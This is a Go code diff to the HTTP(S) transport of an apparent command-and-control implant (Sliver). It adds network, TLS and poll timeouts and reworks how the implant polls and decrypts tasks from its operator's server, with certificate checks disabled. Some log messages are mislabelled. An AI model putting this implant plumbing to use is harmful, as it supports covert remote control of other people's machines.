@@ -61,6 +61,8 @@ var (
 
 // HTTPOptions - c2 specific configuration options
 type HTTPOptions struct {
+	NetTimeout  time.Duration
+	TlsTimeout  time.Duration
 	PollTimeout time.Duration
 
 	ProxyConfig   string
@@ -70,6 +72,20 @@ type HTTPOptions struct {
 
 // ParseHTTPOptions - Parse c2 specific configuration options
 func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
+	netTimeout, err := time.ParseDuration(c2URI.Query().Get("net-timeout"))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to parse poll-timeout %s", err)
+		// {{end}}
+		netTimeout = time.Duration(30 * time.Second)
+	}
+	tlsTimeout, err := time.ParseDuration(c2URI.Query().Get("tls-timeout"))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to parse poll-timeout %s", err)
+		// {{end}}
+		tlsTimeout = time.Duration(30 * time.Second)
+	}
 	pollTimeout, err := time.ParseDuration(c2URI.Query().Get("poll-timeout"))
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -78,7 +94,10 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		pollTimeout = time.Duration(30 * time.Second)
 	}
 	return &HTTPOptions{
-		PollTimeout:   pollTimeout,
+		NetTimeout:  netTimeout,
+		TlsTimeout:  tlsTimeout,
+		PollTimeout: pollTimeout,
+
 		ProxyConfig:   c2URI.Query().Get("proxy"),
 		ProxyUsername: c2URI.Query().Get("proxy-username"),
 		ProxyPassword: c2URI.Query().Get("proxy-password"),
@@ -88,7 +107,8 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 // HTTPStartSession - Attempts to start a session with a given address
 func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
-	client = httpsClient(address, opts.PollTimeout, opts.ProxyConfig)
+	client = httpsClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig)
+	client.pollTimeout = opts.PollTimeout
 	client.PathPrefix = pathPrefix
 	err := client.SessionInit()
 	if err != nil {
@@ -96,7 +116,7 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
 		}
-		client = httpClient(address, opts.PollTimeout, opts.ProxyConfig) // Fallback to insecure HTTP
+		client = httpClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig) // Fallback to insecure HTTP
 		err = client.SessionInit()
 		if err != nil {
 			return nil, err
@@ -107,15 +127,16 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 
 // SliverHTTPClient - Helper struct to keep everything together
 type SliverHTTPClient struct {
-	Origin     string
-	PathPrefix string
-	Client     *http.Client
-	ProxyURL   string
-	SessionCtx *cryptography.CipherContext
-	SessionID  string
-	pollCancel context.CancelFunc
-	pollMutex  *sync.Mutex
-	Closed     bool
+	Origin      string
+	PathPrefix  string
+	Client      *http.Client
+	ProxyURL    string
+	SessionCtx  *cryptography.CipherContext
+	SessionID   string
+	pollTimeout time.Duration
+	pollCancel  context.CancelFunc
+	pollMutex   *sync.Mutex
+	Closed      bool
 }
 
 // SessionInit - Initialize the session
@@ -183,30 +204,48 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 }
 
 // Do - Wraps http.Client.Do with a context
-func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, error) {
+func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, error) {
+	// NOTE: We must atomically manage the context
+	s.pollMutex.Lock()
 	ctx, cancel := context.WithCancel(req.Context())
 	s.pollCancel = cancel
 	defer func() {
-		s.pollMutex.Lock()
-		defer s.pollMutex.Unlock()
 		if s.pollCancel != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Cancelling poll context")
+			// {{end}}
 			s.pollCancel()
 		}
 		s.pollCancel = nil
+		s.pollMutex.Unlock()
 	}()
+
 	done := make(chan error)
 	var resp *http.Response
+	var data []byte
 	var err error
 	go func() {
 		resp, err = s.Client.Do(req.WithContext(ctx))
 		select {
 		case <-ctx.Done():
 			done <- ctx.Err()
+		case <-time.After(s.pollTimeout):
+			// {{if .Config.Debug}}
+			log.Printf("[http] poll timeout error!")
+			// {{end}}
+			done <- http.ErrHandlerTimeout
 		default:
+			data, err = ioutil.ReadAll(resp.Body)
+			defer resp.Body.Close()
+			// {{if .Config.Debug}}
+			if err != nil {
+				log.Printf("[http] poll failed to read all response: %s", err)
+			}
+			// {{end}}
 			done <- err
 		}
 	}()
-	return resp, <-done
+	return resp, data, <-done
 }
 
 // We do our own POST here because the server doesn't have the
@@ -238,7 +277,13 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 		// {{end}}
 		return errors.New("send failed")
 	}
-	respData, _ := ioutil.ReadAll(resp.Body)
+	respData, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] response read error: %s", err)
+		// {{end}}
+		return err
+	}
 	defer resp.Body.Close()
 	data, err := encoder.Decode(respData)
 	if err != nil {
@@ -276,7 +321,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	resp, err := s.DoPoll(req)
+	resp, rawRespData, err := s.DoPoll(req)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] GET failed %v", err)
@@ -293,24 +338,22 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 		return nil, nil
 	}
 	if resp.StatusCode == http.StatusOK {
-		var data []byte
-		respData, _ := ioutil.ReadAll(resp.Body)
-		defer resp.Body.Close()
-		if 0 < len(respData) {
-			data, err = encoder.Decode(respData)
+		var body []byte
+		if 0 < len(rawRespData) {
+			body, err = encoder.Decode(rawRespData)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("Decoding failed %s", err)
+				log.Printf("[http] Decoding failed %s", err)
 				// {{end}}
 				return nil, err
 			}
 		}
-		data, err := s.SessionCtx.Decrypt(data)
+		plaintext, err := s.SessionCtx.Decrypt(body)
 		if err != nil {
 			return nil, err
 		}
 		envelope := &pb.Envelope{}
-		err = proto.Unmarshal(data, envelope)
+		err = proto.Unmarshal(plaintext, envelope)
 		if err != nil {
 			return nil, err
 		}
@@ -510,17 +553,17 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext
 
 // [ HTTP(S) Clients ] ------------------------------------------------------------
 
-func httpClient(address string, timeout time.Duration, proxyConfig string) *SliverHTTPClient {
+func httpClient(address string, netTimeout time.Duration, tlsTimeout time.Duration, proxyConfig string) *SliverHTTPClient {
 	transport := &http.Transport{
 		Dial:                proxy.Direct.Dial,
-		TLSHandshakeTimeout: timeout,
+		TLSHandshakeTimeout: tlsTimeout,
 		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
 	}
 	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("http://%s", address),
 		Client: &http.Client{
 			Jar:       cookieJar(),
-			Timeout:   timeout,
+			Timeout:   netTimeout,
 			Transport: transport,
 		},
 		pollMutex: &sync.Mutex{},
@@ -530,19 +573,19 @@ func httpClient(address string, timeout time.Duration, proxyConfig string) *Sliv
 	return client
 }
 
-func httpsClient(address string, timeout time.Duration, proxyConfig string) *SliverHTTPClient {
+func httpsClient(address string, netTimeout time.Duration, tlsTimeout time.Duration, proxyConfig string) *SliverHTTPClient {
 	transport := &http.Transport{
 		Dial: (&net.Dialer{
-			Timeout: timeout,
+			Timeout: netTimeout,
 		}).Dial,
-		TLSHandshakeTimeout: timeout,
+		TLSHandshakeTimeout: tlsTimeout,
 		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
 	}
 	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("https://%s", address),
 		Client: &http.Client{
 			Jar:       cookieJar(),
-			Timeout:   timeout,
+			Timeout:   netTimeout,
 			Transport: transport,
 		},
 		pollMutex: &sync.Mutex{},
